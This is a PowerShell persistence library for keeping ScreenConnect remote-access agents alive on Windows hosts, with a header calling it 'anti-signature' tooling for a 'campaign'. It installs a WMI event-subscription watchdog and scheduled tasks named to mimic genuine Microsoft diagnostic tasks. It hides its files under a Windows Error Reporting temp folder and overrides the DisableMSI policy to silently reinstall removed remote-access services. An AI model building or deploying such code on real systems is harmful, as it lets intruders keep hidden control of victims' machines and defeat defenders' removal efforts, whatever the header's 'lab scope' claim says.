#Requires -Version 5.1
# ═══════════════════════════════════════════════════════════════
# OWN_LIB  BUILD 20260802L2
# Shared library: per-host identity (anti-signature), WMI watchdog
# (mutual persistence chain), campaign state file, SC service repair.
# L2: safe task-name pools (parents exist on all Win10/11), IDENTVER
# regeneration, -Action repair recreates deleted SC services via
# msiexec /fa {GUID} (never triggers SC-family major-upgrade removal).
# Authorized internal deployment - lab/competition scope only.
# ═══════════════════════════════════════════════════════════════
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [ValidateSet('init', 'watchdog', 'watchdog-ensure', 'state', 'identity', 'repair')]
    [string]$Action,
    [string]$WorkDir = 'C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache',
    [string]$MonPath = '',
    [string]$Build  = 'O15',
    [string]$Extra  = '',
    [string]$Fp     = ''
)

$ErrorActionPreference = 'SilentlyContinue'
$cfgPath = Join-Path $WorkDir 'identity.cfg'
$IdentVersion = 2

# Legit-looking task-name pools; per-host hash picks one per slot.
# v2: ONLY parent folders that exist on every Win10/11 (WwanSvc/MemoryDiagnostic/
# PowerEfficiency/DiskDiagnostic parents are absent on some machines -> /Create failed).
$Pools = @{
    A = @('\Microsoft\Windows\Diagnosis\Scheduled','\Microsoft\Windows\Diagnosis\BVTConsumer','\Microsoft\Windows\NetTrace\GatherNetworkInfo','\Microsoft\Windows\WDI\ResolutionHost','\Microsoft\Windows\PLA\Server Diagnostics','\Microsoft\Windows\Tcpip\IpAddressConflict1','\Microsoft\Windows\PLA\Server','\Microsoft\Windows\Diagnosis\SRTask')
    B = @('\Microsoft\Windows\PLA\Server','\Microsoft\Windows\WDI\ResolutionHost','\Microsoft\Windows\Diagnosis\BVTConsumer','\Microsoft\Windows\NetTrace\GatherNetworkInfo','\Microsoft\Windows\Diagnosis\Scheduled','\Microsoft\Windows\Tcpip\IpAddressConflict2','\Microsoft\Windows\PLA\Server Diagnostics','\Microsoft\Windows\Diagnosis\SRTask')
    C = @('\Microsoft\Windows\WDI\ResolutionHost','\Microsoft\Windows\NetTrace\GatherNetworkInfo','\Microsoft\Windows\Tcpip\IpAddressConflict1','\Microsoft\Windows\Diagnosis\BVTConsumer','\Microsoft\Windows\PLA\Server','\Microsoft\Windows\Diagnosis\Scheduled','\Microsoft\Windows\PLA\Server Diagnostics','\Microsoft\Windows\Diagnosis\SRTask')
    D = @('\Microsoft\Windows\Tcpip\IpAddressConflict1','\Microsoft\Windows\WDI\ResolutionHost','\Microsoft\Windows\NetTrace\GatherNetworkInfo','\Microsoft\Windows\Diagnosis\BVTConsumer','\Microsoft\Windows\PLA\Server','\Microsoft\Windows\Diagnosis\Scheduled','\Microsoft\Windows\PLA\Server Diagnostics','\Microsoft\Windows\Diagnosis\SRTask')
}
$Defaults = [ordered]@{
    TASK_A = '\Microsoft\Windows\Diagnosis\Scheduled'
    TASK_B = '\Microsoft\Windows\PLA\Server'
    TASK_C = '\Microsoft\Windows\WDI\ResolutionHost'
    TASK_D = '\Microsoft\Windows\Tcpip\IpAddressConflict1'
    MO_A   = '2'
    MO_B   = '3'
}

function Get-HostSeed {
    $s = 0L
    foreach ($c in $env:COMPUTERNAME.ToUpper().ToCharArray()) { $s = ($s * 31 + [int]$c) % 1000000007 }
    return $s
}

function Read-Identity {
    $id = $Defaults.Clone()
    if (Test-Path $cfgPath) {
        foreach ($line in (Get-Content -LiteralPath $cfgPath -Force)) {
            if ($line -match '^\s*([A-Z_]+)\s*=\s*(.+?)\s*$') { $id[$matches[1]] = $matches[2] }
        }
    }
    return $id
}

function Remove-TaskQuiet([string]$tn) {
    if ($tn) { & schtasks.exe /Delete /TN $tn /F 2>&1 | Out-Null }
}

function Initialize-Identity {
    # Idempotent within an IDENTVER generation. Pool upgrades bump IDENTVER:
    # old-name tasks are deleted, then identity is regenerated from the same seed.
    if (Test-Path $cfgPath) {
        $old = Read-Identity
        if ($old['IDENTVER'] -eq "$IdentVersion") { return $old }
        foreach ($k in 'TASK_A','TASK_B','TASK_C','TASK_D') { Remove-TaskQuiet $old[$k] }
        Remove-Item -LiteralPath $cfgPath -Force
    }
    $s = Get-HostSeed
    $cfg = @(
        "TASK_A=$($Pools.A[$s % 8])"
        "TASK_B=$($Pools.B[($s + 3) % 8])"
        "TASK_C=$($Pools.C[($s + 5) % 8])"
        "TASK_D=$($Pools.D[($s + 7) % 8])"
        "MO_A=$(2 + ($s % 4))"          # 2-5 min jitter
        "MO_B=$(3 + (($s + 1) % 3))"    # 3-5 min jitter
        "SEED=$s"
        "IDENTVER=$IdentVersion"
    )
    Set-Content -LiteralPath $cfgPath -Value $cfg -Force
    return (Read-Identity)
}

function Install-Watchdog {
    if (-not $MonPath) { return $false }
    $ok = $true
    try {
        Set-WmiInstance -Namespace root\subscription -Class __IntervalTimerInstruction `
            -Arguments @{ TimerId = 'WucacheWatchdog'; IntervalMilliseconds = 180000; SkipIfPassed = $false } | Out-Null
        $f = Set-WmiInstance -Namespace root\subscription -Class __EventFilter `
            -Arguments @{ Name = 'WucacheWatchdogF'; EventNamespace = 'root\cimv2'; QueryLanguage = 'WQL';
                          Query = "SELECT * FROM __TimerEvent WHERE TimerId='WucacheWatchdog'" }
        $c = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer `
            -Arguments @{ Name = 'WucacheWatchdogC'; CommandLineTemplate = "cmd.exe /c `"$MonPath`""; RunInteractively = $false }
        Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding `
            -Arguments @{ Filter = $f; Consumer = $c } | Out-Null
    } catch { $ok = $false }
    return $ok
}

function Ensure-Watchdog {
    $c = Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='WucacheWatchdogC'"
    if ($null -eq $c) {
        Install-Watchdog | Out-Null
        return 'REARMED'
    }
    return 'OK'
}

function Repair-SCService([string]$Fingerprint) {
    # Recreates a deleted SC service entry by repairing the REGISTERED product.
    # msiexec /fa {GUID} repairs in place - it does NOT run the SC-family
    # major-upgrade removal, so other instances are untouched.
    if (-not $Fingerprint) { return 'no-fp' }
    $name = "ScreenConnect Client ($Fingerprint)"
    if (Get-Service -Name $name -ErrorAction SilentlyContinue) { return 'svc-present' }
    $guid = $null
    foreach ($root in 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall',
                      'HKLM:\SOFTWARE\WOW6432Node\CurrentVersion\Uninstall') {
        Get-ChildItem $root -ErrorAction SilentlyContinue | ForEach-Object {
            $dn = (Get-ItemProperty $_.PSPath).DisplayName
            if ($dn -and $dn -like "*$name*" -and $_.PSChildName -like '{*}') { $guid = $_.PSChildName }
        }
    }
    if (-not $guid) { return 'not-registered' }
    & reg.exe delete 'HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer' /v DisableMSI /f 2>&1 | Out-Null
    & reg.exe add 'HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer' /v DisableMSI /t REG_DWORD /d 0 /f 2>&1 | Out-Null
    $log = Join-Path $WorkDir "msi_repair_$Fingerprint.log"
    $p = Start-Process msiexec.exe -ArgumentList "/fa $guid /qn /norestart /L*v `"$log`"" -Wait -PassThru
    Start-Sleep -Seconds 8
    if (Get-Service -Name $name -ErrorAction SilentlyContinue) { return "svc-restored exit=$($p.ExitCode)" }
    return "svc-still-missing exit=$($p.ExitCode)"
}

function Update-State {
    $prim = $null; $alt = $null
    foreach ($svc in (Get-Service -Name 'ScreenConnect Client*')) {
        if ($svc.Name -match '\(([0-9a-f]{16})\)') {
            if ($matches[1] -eq '5f6010579852e507') { $prim = "$($svc.Status)" }
            elseif ($matches[1] -eq 'f861c8140d453427') { $alt = "$($svc.Status)" }
        }
    }
    $foreign = @()
    foreach ($svc in (Get-Service -Name 'ScreenConnect Client*')) {
        if ($svc.Name -match '\(([0-9a-f]{16})\)' -and $matches[1] -notin @('5f6010579852e507','f861c8140d453427')) {
            $foreign += $matches[1]
        }
    }
    $id = Read-Identity
    $tasksOk = 0; $tasksTotal = 0
    foreach ($k in 'TASK_A','TASK_B','TASK_C','TASK_D') {
        $tasksTotal++
        & schtasks.exe /Query /TN $id[$k] 2>&1 | Out-Null
        if ($LASTEXITCODE -eq 0) { $tasksOk++ }
    }
    $wd = Ensure-Watchdog
    $prev = @{}
    $statePath = Join-Path $WorkDir 'state.json'
    if (Test-Path $statePath) {
        try { (Get-Content -LiteralPath $statePath -Raw | ConvertFrom-Json).PSObject.Properties | ForEach-Object { $prev[$_.Name] = $_.Value } } catch {}
    }
    $installCount = 1
    if ($prev.installCount) { $installCount = [int]$prev.installCount }
    if ($prev.prim -and $prev.prim -ne 'Running' -and $prim -eq 'Running') { $installCount++ }
    $state = [ordered]@{
        host         = $env:COMPUTERNAME
        ts           = (Get-Date).ToUniversalTime().ToString('o')
        build        = $Build
        prim         = $(if ($prim) { $prim } else { 'MISSING' })
        alt          = $(if ($alt) { $alt } else { 'MISSING' })
        foreign      = $foreign
        tasksOk      = $tasksOk
        tasksTotal   = $tasksTotal
        watchdog     = $wd
        installCount = $installCount
        lastHeal     = $(if ($Extra) { (Get-Date).ToUniversalTime().ToString('o') } elseif ($prev.lastHeal) { $prev.lastHeal } else { $null })
        note         = $Extra
    }
    ($state | ConvertTo-Json -Compress) | Set-Content -LiteralPath $statePath -Force
    return $state
}

switch ($Action) {
    'init'            { $id = Initialize-Identity; $id.GetEnumerator() | ForEach-Object { "$($_.Key)=$($_.Value)" } }
    'identity'        { $id = Read-Identity; $id.GetEnumerator() | ForEach-Object { "$($_.Key)=$($_.Value)" } }
    'watchdog'        { Install-Watchdog | Out-Null }
    'watchdog-ensure' { Ensure-Watchdog }
    'state'           { Update-State | ConvertTo-Json -Compress }
    'repair'          { Repair-SCService $Fp }
}
